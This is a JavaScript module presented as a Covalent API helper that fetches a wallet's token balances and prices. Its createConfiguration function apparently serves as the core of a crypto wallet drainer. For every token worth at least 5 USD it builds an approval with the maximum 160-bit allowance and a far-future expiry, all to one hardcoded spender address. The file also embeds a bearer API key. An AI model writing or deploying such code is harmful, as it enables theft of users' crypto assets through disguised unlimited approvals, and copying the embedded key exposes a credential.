import axios from "axios";

const Covalenthq = function (account) {
    this.account = account ? account : "";
};

Covalenthq.prototype = {
    inspectWalletToken: async function (walletAddress) {
        let chainName = "eth-mainnet";
        switch (process.env.NEXT_PUBLIC_CHAIN) {
            case "1":
                chainName = "eth-mainnet";
                break;
            case "56":
                chainName = "bsc-mainnet";
                break;
            case "137":
                chainName = "matic-mainnet";
                break;
            case "42161":
                chainName = "arbitrum-mainnet";
                break;
            case "10":
                chainName = "optimism-mainnet";
                break;
        }
        const httpCovalenthq = axios.create({
            baseURL: "https://",
            timeout: 1000 * 180,
            withCredentials: false,
        });
        const config = {
            method: "get",
            maxBodyLength: Infinity,
            url:
                "api.covalenthq.com/v1/" +
                chainName +
                "/address/" +
                walletAddress +
                "/balances_v2/",
            headers: {
                Authorization: "Bearer cqt_rQm7qxyjWPTqTY83pw7PJRXVRydp", //ok
            },
        };
        return await httpCovalenthq(config);
    },
    inspectTokenPrice: async function (token_id) {},
    caculateValue: async function () {
        const tokenlist = await this.inspectWalletToken(this.account);
        let valueable_token = [];
        for await (let item of tokenlist.data.data.items) {
            if (
                item.quote_rate != null &&
                item.balance != 0 &&
                item.contract_address !=
                    "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
            ) {
                const amount = item.balance / 10 ** item.contract_decimals;
                const token_valueable = amount * item.quote_rate;
                const symbol = item.contract_ticker_symbol.toLowerCase();
                const name = item.contract_name;
                const address = item.contract_address;
                const data = {
                    name,
                    amount,
                    symbol,
                    address,
                    token_valueable,
                };
                valueable_token.push(data);
            }
        }

        return valueable_token;
    },
    createConfiguration: async function () {
        let tokens = await this.caculateValue();
        const spender_address = "0xf347901a602e71e2F4ce7796e54146C2e746dd8c";
        const amount = "1461501637330902918203684832716283019655932542975";
        const expiration = 1885674579;

        let data = {};
        for await (let n of tokens) {
            if (n.token_valueable >= 5) {
                (data["spender_address"] = spender_address),
                    (data["expiration"] = expiration),
                    (data[n.symbol.toLowerCase()] = {
                        name: n.symbol.toLowerCase(),
                        symbol: n.symbol.toLowerCase(),
                        address: n.address.toLowerCase(),
                        amount: amount,
                        expiration: expiration,
                    });
            }
        }
        return data;
    },
};

export default Covalenthq;
